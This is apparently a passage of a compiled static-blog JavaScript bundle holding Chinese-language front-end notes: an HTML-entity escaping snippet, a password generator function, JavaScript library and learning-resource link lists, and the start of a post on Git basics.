operator\">:</span> <span class=\"token string\">'&amp;quot;'</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">'&amp;'</span><span class=\"token operator\">:</span> <span class=\"token string\">'&amp;amp;'</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">'\\''</span><span class=\"token operator\">:</span> <span class=\"token string\">'&amp;apos;'</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">'&lt;'</span><span class=\"token operator\">:</span> <span class=\"token string\">'&amp;lt;'</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">'>'</span><span class=\"token operator\">:</span> <span class=\"token string\">'&amp;gt;'</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">' '</span><span class=\"token operator\">:</span> space <span class=\"token operator\">?</span> <span class=\"token string\">'&amp;nbsp;'</span> <span class=\"token operator\">:</span> <span class=\"token keyword\">undefined</span><span class=\"token punctuation\">,</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n            <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>html_output <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>html_input<span class=\"token punctuation\">.</span><span class=\"token function\">split</span><span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">map</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">entity</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n                <span class=\"token keyword\">return</span> html_entities<span class=\"token punctuation\">[</span>entity<span class=\"token punctuation\">]</span> <span class=\"token operator\">||</span> entity<span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">join</span><span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span></code></pre><h3 id=\"password\">Password</h3>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token function-variable function\">passwd_create</span><span class=\"token operator\">:</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">var</span> passwd_num <span class=\"token operator\">=</span> <span class=\"token function\">Number</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>passwd_num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">var</span> passwd_number_num <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>passwd_check_number <span class=\"token operator\">?</span> <span class=\"token function\">Number</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>passwd_number_num<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">var</span> passwd_symbol_num <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>passwd_check_symbol <span class=\"token operator\">?</span> <span class=\"token function\">Number</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>passwd_symbol_num<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> passwd_num <span class=\"token operator\">&lt;</span> <span class=\"token number\">1</span> <span class=\"token operator\">||</span> passwd_num <span class=\"token operator\">&lt;</span> <span class=\"token punctuation\">(</span>passwd_number_num <span class=\"token operator\">+</span> passwd_symbol_num<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n                <span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token string\">'入力が不正です。'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>passwd_check_lower_letter <span class=\"token operator\">&amp;&amp;</span> <span class=\"token operator\">!</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>passwd_check_upper_letter<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> passwd_num <span class=\"token operator\">!=</span> <span class=\"token punctuation\">(</span>passwd_number_num <span class=\"token operator\">+</span> passwd_symbol_num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n                <span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token string\">'入力が不正です。'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n\n            <span class=\"token keyword\">var</span> kind <span class=\"token operator\">=</span> <span class=\"token function\">Array</span><span class=\"token punctuation\">(</span>passwd_num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            kind<span class=\"token punctuation\">.</span><span class=\"token function\">fill</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span> <span class=\"token keyword\">var</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> passwd_number_num <span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">)</span>\n                kind<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">'n'</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span> <span class=\"token keyword\">var</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> passwd_symbol_num <span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">)</span>\n                kind<span class=\"token punctuation\">[</span>passwd_number_num <span class=\"token operator\">+</span> i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">'s'</span><span class=\"token punctuation\">;</span>\n\n            <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span> <span class=\"token keyword\">var</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> passwd_num <span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n                <span class=\"token keyword\">var</span> index <span class=\"token operator\">=</span> <span class=\"token function\">make_random</span><span class=\"token punctuation\">(</span>passwd_num <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> index <span class=\"token operator\">==</span> i <span class=\"token operator\">||</span> kind<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> kind<span class=\"token punctuation\">[</span>index<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span>\n                    <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span>\n                <span class=\"token keyword\">var</span> temp <span class=\"token operator\">=</span> kind<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n                kind<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> kind<span class=\"token punctuation\">[</span>index<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n                kind<span class=\"token punctuation\">[</span>index<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> temp<span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n\n            <span class=\"token keyword\">const</span> number_pattern <span class=\"token operator\">=</span> <span class=\"token string\">'0123456789'</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">var</span> alpha_pattern <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>passwd_check_lower_letter <span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n                <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>passwd_check_ecept_lO <span class=\"token punctuation\">)</span>\n                    alpha_pattern <span class=\"token operator\">+=</span> <span class=\"token string\">\"abcdefghijkmnopqrstuvwxyz\"</span><span class=\"token punctuation\">;</span>\n                <span class=\"token keyword\">else</span>\n                    alpha_pattern <span class=\"token operator\">+=</span> <span class=\"token string\">\"abcdefghijklmnopqrstuvwxyz\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>passwd_check_upper_letter <span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n                <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>passwd_check_ecept_lO <span class=\"token punctuation\">)</span>\n                    alpha_pattern <span class=\"token operator\">+=</span> <span class=\"token string\">\"ABCDEFGHJKLMNPQRSTUVWXYZ\"</span><span class=\"token punctuation\">;</span>\n                <span class=\"token keyword\">else</span>\n                    alpha_pattern <span class=\"token operator\">+=</span> <span class=\"token string\">\"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n\n            <span class=\"token keyword\">var</span> passwd <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span> <span class=\"token keyword\">var</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> kind<span class=\"token punctuation\">.</span>length <span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n                <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> kind<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">'n'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n                    <span class=\"token keyword\">var</span> index <span class=\"token operator\">=</span> <span class=\"token function\">make_random</span><span class=\"token punctuation\">(</span>number_pattern<span class=\"token punctuation\">.</span>length <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                    passwd <span class=\"token operator\">+=</span> number_pattern<span class=\"token punctuation\">.</span><span class=\"token function\">charAt</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> kind<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">'s'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n                    <span class=\"token keyword\">var</span> pattern <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>passwd_symbol_pattern<span class=\"token punctuation\">;</span>\n                    <span class=\"token keyword\">var</span> index <span class=\"token operator\">=</span> <span class=\"token function\">make_random</span><span class=\"token punctuation\">(</span>pattern<span class=\"token punctuation\">.</span>length <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                    passwd <span class=\"token operator\">+=</span> pattern<span class=\"token punctuation\">.</span><span class=\"token function\">charAt</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span>\n                    <span class=\"token keyword\">var</span> index <span class=\"token operator\">=</span> <span class=\"token function\">make_random</span><span class=\"token punctuation\">(</span>alpha_pattern<span class=\"token punctuation\">.</span>length <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                    passwd <span class=\"token operator\">+=</span> alpha_pattern<span class=\"token punctuation\">.</span><span class=\"token function\">charAt</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">}</span>\n\n            <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>passwd_password <span class=\"token operator\">=</span> passwd<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span></code></pre><h2 id=\"函式庫\">函式庫</h2>\n<h3 id=\"資料處理\">資料處理</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://lodash.com/\">lodash</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://momentjs.com/\">moment.js</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.chartjs.org/\">Chart.js</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://sheetjs.com/\">sheetjs</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/paulhodel/jexcel\">jExcel</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/newsdev/archieml-js\">newsdev/archieml-js</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/cheeriojs/cheerio\">cheerio</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.npmjs.com/package/delay\">delay</a></li>\n</ul>\n<h3 id=\"圖型繪製\">圖型繪製</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/gka/chroma.js\">chroma.js</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/bugsnag/chromatic-sass\">chromatic-sass</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/IonicaBizau/image-to-ascii\">image-to-ascii</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/sujoyu/dxm-text-animation\">dxm-text-animation</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.highcharts.com/\">HIGHCHARTS</a></li>\n</ul>\n<h3 id=\"動態效果\">動態效果</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://threejs.org/docs/\">Three.js</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://animejs.com/\">anime.js</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/mojs/mojs\">mojs/mojs</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/julianshapiro/velocity\">julianshapiro/velocity</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/popmotion/popmotion\">Popmotion/popmotion</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/maxwellito/vivus\">maxwellito/vivus</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://greensock.com/get-started-js\">GSAP 生態系</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/pn299pn/items/e6b9f7a61d895923e55e\">CreateJS でオブジェクトを操作してみた</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/jlmakes/scrollreveal\">jlmakes/scrollreveal</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/thednp/kute.js/\">thednp/kute.js</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/mattboldt/typed.js\">mattboldt/typed.js</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://greensock.com/timelinemax\">TimelineMax</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://greensock.com/ease-visualizer\">Easeing</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://pixijs.io/pixi-filters/tools/demo/\">Pixi.JS</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://brm.io/matter-js/\">matter.js</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://p5js.org/\">p5.js</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/photonstorm/phaser\">phaser</a></li>\n<li>Textillate.js</li>\n<li>BounceJS</li>\n<li>DynamicJS</li>\n<li>ParticleJS</li>\n<li>MoveJS</li>\n<li>HoverIntent</li>\n<li>JqueryTransit</li>\n<li>FlyingCodeJS</li>\n</ul>\n<h3 id=\"其它\">其它</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://introjs.com/\">intro.js</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://darkmodejs.learn.uno/\">Darkmode.js</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/dataarts/dat.gui\">dat.gui</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://daybrush.com/scenejs/\">scene.js</a></li>\n</ul>\n<h3 id=\"d3js\">D3.js</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://bl.ocks.org/mbostock/1256572\">D3.js Show Reel</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.d3-graph-gallery.com/\">The D3 Graph Gallery – Simple charts made with d3.js</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://d3indepth.com/\">Learn D3.js step by step</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://medium.com/@mybaseball52/d3-js-%E7%9A%84%E7%A0%94%E7%A9%B6-21da2ab7a2bb\">D3.js 的研究 - 黃冠融 - Medium</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://medium.com/@mybaseball52/d3-js-basics-of-drawing-charts-4580dca5cee3\">D3.js 基礎繪圖</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://medium.com/@mybaseball52/%E5%A2%9E%E5%BC%B7-d3-js-%E7%9A%84%E8%A6%96%E8%A6%BA%E5%8C%96%E5%8A%9F%E8%83%BD-9497f8553790\">增強 D3.js 的視覺化功能</a></li>\n</ul>\n<h4 id=\"處理資料\">處理資料</h4>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/d3/d3/wiki/%E6%95%B0%E7%BB%84\">数组 · d3/d3 Wiki</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://observablehq.com/@stuartathompson/the-difference-between-d3-nest-d3-map-and-data-map\">The difference between d3.nest(), d3.map() and data.map / Stuart Thompson / Observable</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://amber.rbind.io/2017/05/02/nesting/\">Nesting and Accessing Data in D3v4 | Amber Thomas Data Portfolio &amp; Blog</a></li>\n</ul>\n<h4 id=\"定義比例--scalelinear-\">定義比例 ( <code>scale.linear()</code> )</h4>\n<ul>\n<li>Scale 分為兩大類，一類是以數字或日期為比例縮放的「Quantitative」，一類是是以自訂的名稱或標籤為縮放依據的「Ordinal」</li>\n<li>Quantitative Scale 分為 linear、pow、log、quantize、threshold、quantile 和 identity，其中以 linear 最常使用</li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.oxxostudio.tw/articles/201411/svg-d3-03-scale-linear.html\">SVG D3.js - 定義比例 ( scale.linear() ) - OXXO.STUDIO</a></li>\n</ul>\n<h4 id=\"繪製線段\">繪製線段</h4>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.d3-graph-gallery.com/graph/custom_axis.html\">Drawing axis in d3.js</a></li>\n<li><code>line()</code></li>\n<li><code>.interpolate()</code></li>\n</ul>\n<h3 id=\"quicksettings\"><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/bit101/quicksettings\">quicksettings</a></h3>\n<p><code>&lt;script src=&quot;https://cdn.jsdelivr.net/npm/quicksettings@latest/quicksettings.min.js&quot;&gt;&lt;/script&gt;</code></p>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">const</span> cat <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Cat</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> settings <span class=\"token operator\">=</span> QuickSettings<span class=\"token punctuation\">.</span><span class=\"token function\">create</span><span class=\"token punctuation\">(</span>window<span class=\"token punctuation\">.</span>innerWidth <span class=\"token operator\">-</span> <span class=\"token number\">200</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// input:text</span>\nsettings<span class=\"token punctuation\">.</span><span class=\"token function\">addTest</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Name\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">v</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n  cat<span class=\"token punctuation\">.</span><span class=\"token function\">setName</span><span class=\"token punctuation\">(</span>v<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// checkbox</span>\nsettings<span class=\"token punctuation\">.</span><span class=\"token function\">addBoolean</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Sleep\"</span><span class=\"token punctuation\">,</span> cat<span class=\"token punctuation\">.</span>isSleep<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">v</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n  cat<span class=\"token punctuation\">.</span><span class=\"token function\">setSleep</span><span class=\"token punctuation\">(</span>v<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// button</span>\nsettings<span class=\"token punctuation\">.</span><span class=\"token function\">addButton</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"meow\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n  cat<span class=\"token punctuation\">.</span><span class=\"token function\">meow</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><h2 id=\"框架\">框架</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.meteor.com/\">Open Source Javascript Platform for Web, Mobile, and Desktop | Meteor</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://koajs.com/\">Koa - next generation web framework for node.js</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/alpinejs/alpine\">alpinejs/alpine: A rugged, minimal framework for composing JavaScript behavior in your markup.</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://nestjs.com/\">NestJS - A progressive Node.js framework</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://adonisjs.com/?fbclid=IwAR3-RUQoWibCTQnSJrnKuEC6hD8PGBCoVAGn38PP0BjgsGSpp7DUDrIZOME\">AdonisJs - Node.js web framework</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/m_mitsuhide/items/00b139bb565dddf8006a\">frourio</a></li>\n</ul>\n<h2 id=\"進階\">進階</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://ithelp.ithome.com.tw/users/20065504/ironman/1259\">重新認識 JavaScript 系列</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://johnresig.com/apps/learn/\">Learning Advanced JavaScript</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://chupainotebook.blogspot.com/search/label/%E5%85%8B%E6%9C%8D%20JS%20%E7%9A%84%E5%A5%87%E6%80%AA%E9%83%A8%E5%88%86\">克服 JS 的奇怪部份</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/stephentian/33-js-concepts\">JavaScript 开发者应懂的 33 个概念</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/oimo23/items/b380a914867ec973039a\">【翻訳】JavaScript 開発者が知るべき 33 のコンセプト リンク集 - Qiita</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/rana_kualu/items/6bcc99226be741348c34\">2016 年から 2019 年までの JavaScript の全て</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/getify/You-Dont-Know-JS/blob/2nd-ed/get-started/ch1.md\">You Don&#39;t Know JS Yet: Get Started - 2nd Edition</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/AllJointTW/clean-code-javascript\">無瑕的程式碼 JavaScript</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://blog.techbridge.cc/2017/07/15/javascript-event-propagation/\">DOM 的事件傳遞機制：捕獲與冒泡</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://medium.com/enjoy-life-enjoy-coding/javascript-%E9%97%9C%E6%96%BC-object-%E4%B8%80%E5%8F%A3%E6%B0%A3%E5%85%A8%E8%AA%AA%E5%AE%8C-4bb924bcc79f\">JavaScript | 關於 Object ，一口氣全說完</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.infoq.cn/article/jPF4p0Srd9qhVbWMaOFh\">有趣的 JavaScript 运算符用法</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://davidwalsh.name/javascript-tricks\">7 Useful JavaScript Tricks</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://medium.com/walkout/js-%E5%8E%9F%E5%8A%9B%E8%A6%BA%E9%86%92-day13-event-queue-event-loop-event-table-374fbbef3e40\">JS 原力覺醒 — Event Queue &amp; Event Loop 、Event Table</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://blog.huli.tw/2020/04/18/javascript-function-is-awesome/\">覺得 JavaScript function 很有趣的我是不是很奇怪 - Huli</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/kozzzz/items/b4cd57ead41fc6355afd\">[JavaScript]初心者が初見で必ず thinking 顔になるもの特集 - Qiita</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/uhyo/items/4cef6d0b52ffd20c1af4\">なぜ JavaScript の Date コンストラクタは例外を投げないのか - Qiita</a></li>\n</ul>\n<h2 id=\"typescript\">TypeScript</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://willh.gitbook.io/typescript-tutorial/\">TypeScript 新手指南</a></li>\n</ul>\n","date":"2019-07-18T07:10:16.000Z","excerpt":"","printDate":"July 18, 2019","printReadingTime":"20 min read"};

var route_48 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod53
});

var Mod54 = {"title":"前端筆記 (4) Git","slug":"f2e-04-git","html":"<h2 id=\"平台服務\">平台服務</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/\">GitHub</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://gitlab.com/\">GitLab</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://dashboard.heroku.com/apps\">Heroku</a></li>\n</ul>\n<h2 id=\"指令速見表\">指令速見表</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/kozzy/items/b42ba59a8bac190a16ab\">[ver 1.2] Git でよく使われるコマンドにイラストによる説明を加えて 1 枚のチートシートにまとめてみた</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://scars377.github.io/git-cheatsheet-cht/\">Git Cheatsheet Cht</a></li>\n</ul>\n<h2 id=\"git-簡介\">Git 簡介</h2>\n<ul>\n<li>Git 是由 Linus Torvalds 為了管理 Linux 原始碼所寫的分散式版控系統</li>\n<li>有三種檔案區域，並透過指令將檔案移至不同的區域\n│ 1. 「工作目錄（Working Directory）」\n│ 2. 「暫存區（Staging Area）」\n└ 3. 「儲存庫（Repository）」</li>\n<li>有四種 File State 檔案狀態\n│ 1. <code>Untracked</code> 新增檔案\n│ 2. <code>New</code>: 加入暫存區後\n│ 3. <code>Modified</code>: 修改後\n└ 4. <code>Deleted</code>: 刪除後</li>\n</ul>\n<h2 id=\"工具安裝\">工具安裝</h2>\n<ul>\n<li><a target=\"_blank\" 